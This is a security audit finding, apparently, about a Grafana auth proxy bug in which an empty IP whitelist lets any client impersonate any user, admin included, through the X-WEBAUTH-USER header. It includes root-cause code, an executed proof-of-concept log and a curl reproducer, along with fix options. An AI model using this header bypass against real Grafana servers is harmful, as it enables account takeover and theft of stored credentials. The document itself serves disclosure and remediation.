ID: H6
Title: Auth Proxy Empty Whitelist Allows Any Client to Impersonate Any User
Severity: HIGH
Component: pkg/services/authn/clients/proxy.go
PoC-Status: executed

---

## Summary

When Grafana's auth proxy feature is enabled (`[auth.proxy] enabled = true`), the IP
allowlist (`whitelist`) defaults to an empty string. The `isAllowedIP()` function returns
`true` unconditionally when the parsed allowlist is empty, because the guard condition is
`len(c.acceptedIPs) == 0`. Any network-reachable client can authenticate as any Grafana
user — including `admin` — by setting a single HTTP header (`X-WEBAUTH-USER` by default).

The feature is disabled by default (`enabled = false`), but the insecure fallback is
activated the moment an operator enables auth proxy without explicitly restricting the
whitelist, which is a common and expected deployment pattern.

---

## Vulnerability

### Root Cause

```go
// pkg/services/authn/clients/proxy.go:200-202
func (c *Proxy) isAllowedIP(r *authn.Request) bool {
    if len(c.acceptedIPs) == 0 {
        return true          // <-- any IP accepted when no whitelist is configured
    }
    host, _, err := net.SplitHostPort(r.HTTPRequest.RemoteAddr)
    // ...
}
```

```go
// pkg/services/authn/clients/proxy.go:220-224
func parseAcceptList(s string) ([]*net.IPNet, error) {
    if len(strings.TrimSpace(s)) == 0 {
        return nil, nil      // empty string -> nil slice -> len(acceptedIPs)==0
    }
    // ...
}
```

```ini
# conf/defaults.ini:978
whitelist =   ; empty by default
```

The chain is: default empty `whitelist` string -> `parseAcceptList` returns nil ->
`Proxy.acceptedIPs` has length 0 -> `isAllowedIP` returns true for every caller.

### Trust Boundary

The auth proxy is designed to be placed behind a trusted reverse proxy (nginx, Apache,
traefik) that authenticates users externally and forwards their identity via a header.
Only the reverse proxy's IP address should be trusted to set that header.

With an empty whitelist, the trust is extended to all IP addresses reachable on the
network — effectively turning an identity-assertion mechanism into an open
unauthenticated login gate.

---

## Impact

**CVSS v3.1 estimate: 9.8 (Critical network-exploitable auth bypass)**

- Complete authentication bypass — any user account can be impersonated, including
  server administrators.
- An attacker with network access can issue a single HTTP request with
  `X-WEBAUTH-USER: admin` and obtain full administrative privileges.
- With `auto_sign_up = true` (default), accounts for arbitrary usernames are created
  on first use, enabling lateral movement and persistence.
- All data in Grafana is accessible: dashboards, datasource credentials, alerting
  configurations, API keys, and connected data stores.

---

## Proof of Concept

Tested against `grafana/grafana:11.4.0` running in Docker with
`GF_AUTH_PROXY_ENABLED=true` and `GF_AUTH_PROXY_WHITELIST=` (empty).

### Execution

```
[baseline] /api/org without header => 401 (correct)
[exploit] X-WEBAUTH-USER: admin  =>  HTTP 200
[body]    {"id":1,"name":"Main Org.","address":{...}}

[CONFIRMED] Authentication bypass — impersonated 'admin' from arbitrary IP
            Root cause: isAllowedIP() returns true for empty acceptedIPs slice
            (proxy.go:200-202)
[users]   [
  {"id":1,"login":"admin","isAdmin":true,"authLabels":["","Auth Proxy"],...},
  {"id":2,"login":"attacker_1775925603","authLabels":["","Auth Proxy"],...}
]
```

The response to `curl -H "X-WEBAUTH-USER: admin" http://grafana:3001/api/org` returns
HTTP 200 with org data. `/api/users` confirms `isAdmin: true` and that the auth module
used was `Auth Proxy`. The second user entry shows auto-signup creating a new account
from an attacker-chosen username.

### Minimal Reproducer

```bash
# Provision
docker run -d --name grafana-h6 -p 3001:3000 \
  -e GF_AUTH_PROXY_ENABLED=true \
  grafana/grafana:11.4.0

# Exploit (from any IP address)
curl -H "X-WEBAUTH-USER: admin" http://localhost:3001/api/org
# Returns HTTP 200 with org data — fully authenticated as admin
```

Evidence files:
- `evidence/setup.sh` — container provisioning
- `evidence/setup.log` — provisioning output
- `evidence/healthcheck.log` — service verification
- `evidence/exploit.sh` — full exploit with step-by-step output
- `evidence/exploit.log` — exploit execution log
- `evidence/impact.log` — impact summary
- `evidence/env-info.txt` — environment details
- `evidence/poc.sh` — minimized self-contained PoC

---

## Code Path

```
HTTP request with X-WEBAUTH-USER header
  -> pkg/services/authn/clients/proxy.go Proxy.Authenticate() [line 76]
  -> Proxy.isAllowedIP() [line 79]
      -> len(c.acceptedIPs) == 0  [line 201]  -- returns true (BUG)
  -> getProxyHeader() reads X-WEBAUTH-USER value [line 83]
  -> downstream ProxyClient.AuthenticateProxy() — user authenticated
```

---

## Recommended Fix

The `isAllowedIP` guard should be inverted: an empty whitelist should **deny all** (or
require the operator to explicitly opt in to allowing all IPs).

```go
// Option A — deny-by-default: require at least one allowed CIDR
func (c *Proxy) isAllowedIP(r *authn.Request) bool {
    if len(c.acceptedIPs) == 0 {
        return false   // no whitelist configured = deny all
    }
    // ... existing IP check ...
}
```

```go
// Option B — explicit opt-in to allow-all
// Add a config field: allow_all_ips = false
// Only return true for empty list when allow_all_ips is explicitly set to true.
```

Regardless of the code fix, the default configuration should be documented clearly with
a warning that enabling auth proxy without a whitelist is insecure.

---

## References

- Affected file: `pkg/services/authn/clients/proxy.go`
- Bug lines: 200-202 (`isAllowedIP`), 220-224 (`parseAcceptList`)
- Config: `conf/defaults.ini` line 978 (`whitelist =`)
- Grafana docs: https://grafana.com/docs/grafana/latest/setup-grafana/configure-security/configure-authentication/auth-proxy/
